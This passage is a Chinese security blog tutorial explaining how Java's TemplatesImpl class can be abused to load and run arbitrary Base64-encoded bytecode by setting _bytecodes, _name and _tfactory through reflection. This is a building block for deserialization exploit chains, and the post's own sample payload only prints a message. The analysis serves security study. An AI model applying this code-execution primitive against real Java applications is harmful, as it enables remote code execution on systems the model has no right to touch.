<!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
    
	<title>Mask安全小组&#39;s Blog</title>
    <meta name="author" content="">
    
	<meta name="description" content=""> <!-- TODO: truncate -->
	
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

	<link href="atom.xml" rel="alternate" title="Mask安全小组&#39;s Blog" type="application/atom+xml">
	<link href="/favicon.ico" rel="shortcut icon">
    <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
    <link href="/stylesheets/custom.css" media="screen, projection" rel="stylesheet" type="text/css">
    <link href="/stylesheets/hljs.css" media="screen, projection" rel="stylesheet" type="text/css">

    <link href='/stylesheets/font.css' rel='stylesheet' type='text/css'>
	<script src="//cdn.bootcdn.net/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![}]-->

    <script type="text/javascript" src="/javascripts/jquery-tapir.js"></script>

    <!-- remove or comment it to disable ajaxification -->   
    <!-- <script src="/javascripts/ajaxify.js"></script> -->

    

    

<meta name="generator" content="Hexo 6.2.0"></head>


<body>
    <div id="wrapper">
    <header id="header" class="inner"><!-- for more effects see _animate.scss -->
<h1 class="animated bounceInDown">
    <div id="headerbg">
        Mask安全小组&#39;s Blog
    </div>
</h1>
<span class="subtitle"></span>
<br>

<ul id="social-links" style="text-align:center; clear:both;">
  
  
  
  
  
  
  
  
</ul>


<!-- use full url including 'index.html' for navigation bar if you are using ajax -->
<ul id="nav">
	<li id="ajax"><a href="/index.html">首页</a></li>
	<li id="ajax"><a href="/archives/index.html">文章</a></li>
	<li id="ajax"><a href="/tags/index.html">标签</a></li>
    <li><a href="/atom.xml">RSS</a></li>
    
    <li>
    <div id="dark">
        <form action="//www.google.com.hk/search" method="get" accept-charset="UTF-8" id="search">
            <input type="hidden" name="sitesearch" value="https://blog.mask-sec.com" />
            <input type="text" name="q" results="0" placeholder="搜索..." x-webkit-speech />
        </form>
    </div>
    </li>
        
</ul>




</header>

<div id="toload">
<!-- begin toload -->
    <div id="content" class="inner">
        



  <article class="post">
	<h2 class="title">
		<a href="2022/12/20/Java安全-TemplateImpl的用处与分析/">Java安全-TemplatesImpl的用处与分析</a>
	</h2>
    <div class="entry-content">
    <div class="meta">
      <div class="date">发布时间: <time datetime="2022-12-19T16:00:00.000Z" itemprop="datePublished">2022-00-20</time>
</div>
      <div class="tags">标签: 

<a href="/tags/Java安全/">Java安全</a>
</div>
    </div>
      
        <p>在之前的文章分析中，所有用到的Payload都仅仅已弹出计算器作为演示，那么如果我想要执行一些复杂逻辑的Java代码，要如何实现呢？</p>
<p>这时就可以用到标题上述的<code>TemplatesImpl</code>，当然你也可以选择利用<code>URLClassLoader</code>。在学习这边文章之前，建议先看一下<a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=MzkyNDM4MzQ3MA==&mid=2247483819&idx=1&sn=1f251a6b512470871472aacdac350f15&chksm=c1d7e02af6a0693c17685915da7b1b568e9245d50f7411a831567da1ebc01024c6fe7c80714d&scene=21#wechat_redirect">Java字节码动态加载</a>。</p>
<h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><p>首先这个类在<code>Jdk8u251</code>之前是包含在Jdk里的，全类名: <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>。之后版本的<code>Jdk</code>要想使用该类的话就需要引入<code>Apache Xalan</code>。</p>
<h1 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h1><p>这个类实现接口有如下2个:</p>
<ul>
<li>javax.xml.transform.Templates</li>
<li>java.io.Serializable 可以看出是可序列化的类</li>
</ul>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109223652313.png" alt="图片"></p>
<p>同时在该类中含有一个内部类<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader</code>，该类继承至<code>ClassLoader</code>。也就是说明它是一个类加载器</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109223700191.png" alt="图片"></p>
<h2 id="TransletClassLoader"><a href="#TransletClassLoader" class="headerlink" title="TransletClassLoader"></a>TransletClassLoader</h2><p>该类重写了<code>loadClass</code>和<code>defineClass</code>函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">  TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">    <span class="built_in">super</span>(parent);</span><br><span class="line">    _loadedExternalExtensionFunctions = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">    <span class="built_in">super</span>(parent);</span><br><span class="line">    _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    Class&lt;?&gt; ret = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="literal">null</span>) &#123;</span><br><span class="line">      ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="literal">null</span>) &#123;</span><br><span class="line">      ret = <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h1><p>先创建一个类，这个类需要继承<code>AbstractTranslet</code>。原因在后边会说到</p>
<p>注意下边这个操作用的是<code>Jdk1.8u60</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestTemplatesImpl</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;TestTemplatesImpl......&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取字节码，并编码为<code>Base64</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Encoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(TestTemplatesImpl.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BASE64Encoder</span>().encode(javaClass.getBytes());</span><br><span class="line">        System.out.println(encode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用<code>TemplatesImpl</code>加载字节码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 这里填入之前的字节码</span></span><br><span class="line">        <span class="type">byte</span>[] code = <span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>().decodeBuffer(<span class="string">&quot;yv66vgAAADQALAoABgAdCQAeAB8IACAKACEAIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAxTGNvbS9yaWNoYXJkdGFuZy90ZW1wbGF0ZXN0ZXN0L1Rlc3RUZW1wbGF0ZXNJbXBsOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAlAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAWVGVzdFRlbXBsYXRlc0ltcGwuamF2YQwABwAIBwAmDAAnACgBABdUZXN0VGVtcGxhdGVzSW1wbC4uLi4uLgcAKQwAKgArAQAvY29tL3JpY2hhcmR0YW5nL3RlbXBsYXRlc3Rlc3QvVGVzdFRlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAEACQAAAD8AAgABAAAADSq3AAGyAAISA7YABLEAAAACAAoAAAAOAAMAAAALAAQADAAMAA0ACwAAAAwAAQAAAA0ADAANAAAAAQAOAA8AAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAABIACwAAACAAAwAAAAEADAANAAAAAAABABAAEQABAAAAAQASABMAAgAUAAAABAABABUAAQAOABYAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAABcACwAAACoABAAAAAEADAANAAAAAAABABAAEQABAAAAAQAXABgAAgAAAAEAGQAaAAMAFAAAAAQAAQAVAAEAGwAAAAIAHA==&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;TestTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行之后，就能在控制台看到，之前在<code>TestTemplatesImpl</code>类的构造函数里写的打印函数被执行了。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109223800889.png" alt="图片"></p>
<p>ok，那这有2个疑问。</p>
<ul>
<li>为什么要继承<code>AbstractTranslet</code>？</li>
<li>通过反射赋值的几个属性是干嘛用的？</li>
</ul>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这里我们先来分析一下<code>TemplatesImpl</code>执行自定义字节码的流程是怎么样的。</p>
<p>先获取一个<code>TemplatesImpl</code>实例，这个直接通过<code>new</code>无参构造函数即可得到。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br></pre></td></tr></table></figure>

<p>源码中这个无参构造完全是纯空的，没有什么特别的操作。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109223822091.png" alt="图片"></p>
<p>接着通过反射的方式设置了几个字段的值，这个我们先放一下。先来看一下<code>obj.newTransformer()</code>。</p>
<p>在<code>newTransformer()</code>函数内部又调用了<code>new TransformerImpl(...)</code>,注意这是另外一个类，名字有点像别搞混了。</p>
<p>那么<code>new TransformerImpl</code>时的第一个参数为<code>getTransletInstance()</code>，调用了另外一个函数，将返回值作为参数传递。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109223830731.png" alt="图片"></p>
<p>跟进<code>getTransletInstance()</code>内部，又进一步调用到了<code>defineTransletClasses()</code>，继续跟进看看这个函数。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109223838316.png" alt="图片"></p>
<p>在这个函数内部看到将参数<code>_bytecodes</code>传给了<code>loader.defineClass()</code>，而这个<code>defineClass</code>是<code>ClassLoader</code>内一个用来定义<code>Java</code>类的函数。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109223845406.png" alt="图片"></p>
<p>那么这里这个<code>loader</code>是什么呢？在下图中可以看到它是<code>TransletClassLoader</code>类型，这个在前边说过是一个内部类，继承自<code>ClassLoader</code>，并且它重写了<code>defineClass</code>和<code>loadClass</code>。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109223852180.png" alt="图片"></p>
<p>那么回看之前的<code>setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;code&#125;);</code>语句，就能知道，我们通过反射将字节码赋值给了<code>_bytecode</code>。然后调用<code>obj.newTransformer()</code>，代码的执行流程会将<code>_bytecodes</code>交给<code>TransletClassLoader</code>的<code>defineClass</code>函数，从而最终能执行我们自定义加载的类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">      <span class="type">byte</span>[] code = <span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>().decodeBuffer(<span class="string">&quot;yv66vgAAADQALAoABgAdCQAeAB8IACAKACEAIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAxTGNvbS9yaWNoYXJkdGFuZy90ZW1wbGF0ZXN0ZXN0L1Rlc3RUZW1wbGF0ZXNJbXBsOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAlAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAWVGVzdFRlbXBsYXRlc0ltcGwuamF2YQwABwAIBwAmDAAnACgBABdUZXN0VGVtcGxhdGVzSW1wbC4uLi4uLgcAKQwAKgArAQAvY29tL3JpY2hhcmR0YW5nL3RlbXBsYXRlc3Rlc3QvVGVzdFRlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAEACQAAAD8AAgABAAAADSq3AAGyAAISA7YABLEAAAACAAoAAAAOAAMAAAALAAQADAAMAA0ACwAAAAwAAQAAAA0ADAANAAAAAQAOAA8AAgAJAAAAPwAAAAMAAAABsQAAAAIACgAAAAYAAQAAABIACwAAACAAAwAAAAEADAANAAAAAAABABAAEQABAAAAAQASABMAAgAUAAAABAABABUAAQAOABYAAgAJAAAASQAAAAQAAAABsQAAAAIACgAAAAYAAQAAABcACwAAACoABAAAAAEADAANAAAAAAABABAAEQABAAAAAQAXABgAAgAAAAEAGQAaAAMAFAAAAAQAAQAVAAEAGwAAAAIAHA==&quot;</span>);</span><br><span class="line">      <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">      setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">      setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;TestTemplatesImpl&quot;</span>);</span><br><span class="line">      setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">      obj.newTransformer();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>这里我们需要注意一些问题，在<code>getTransletInstance()</code>函数的代码内，存在<code>if(_name == null) return null;</code>的判断，如果这里为<code>true</code>的话后续的代码就不会执行，所以我们必须要它为<code>false</code>，才能进入到<code>defineTransletClasses();</code>这个函数。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109223907597.png" alt="图片"></p>
<p>所以我们在前边的代码中还需要将这个值进行设置，只要是非null即可。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;TestTemplatesImpl&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>那么还有一行代码如下，那么这一行又是干嘛的呢？我们回到前边获取<code>loader</code>的代码那里。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure>

<p>根据下边的情况，如果<code>_tfactory</code>为<code>null</code>的话就会抛出空指针异常，那么就没办法正常执行代码，从而<code>loader</code>这个变量也将无法获取到<code>TransletClassLoader</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 注意这里是需要用到_tfactory的，并且调用了它的getExternalExtensionsMap()。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(</span><br><span class="line">      ObjectFactory.findClassLoader(),</span><br><span class="line">      _tfactory.getExternalExtensionsMap()</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>那么为了上边这段代码能正常运行，就必须让<code>_tfactory</code>不为空，并且能正常调用<code>getExternalExtensionsMap()</code>，那么需要将<code>_tfactory</code>需要设置成什么值呢？</p>
<p>这里我们在上下文搜索<code>_tfactory</code>，根据它的类型进行赋值即可，<code>new TransformerFactoryImpl</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-TemplateImpl%E7%9A%84%E7%94%A8%E5%A4%84%E4%B8%8E%E5%88%86%E6%9E%90/640-20230109223946651.png" alt="图片"></p>
<p>到这里还并没有结束，虽然都满足了前边的条件，可以将字节码顺利传入到<code>TransletClassLoader</code>中进行加载。</p>
<p>但是前边我们声明的<code>TestTemplatesImpl</code>类是需要继承的<code>AbstractTranslet</code>，那么为什么需要这样做呢？</p>
<p>这里需要先说明一个问题，字节码在被<code>ClassLoader</code>的<code>defineClass</code>加载后呢并不会执行对应字节码类的构造函数和静态代码块。</p>
<p>我们来举个例子，定义一个类:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTestEntity</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ClassLoaderTestEntityStaticBlock...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClassLoaderTestEntity</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ClassLoaderTestEntityConstructor...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>获取这个类的字节码</p>
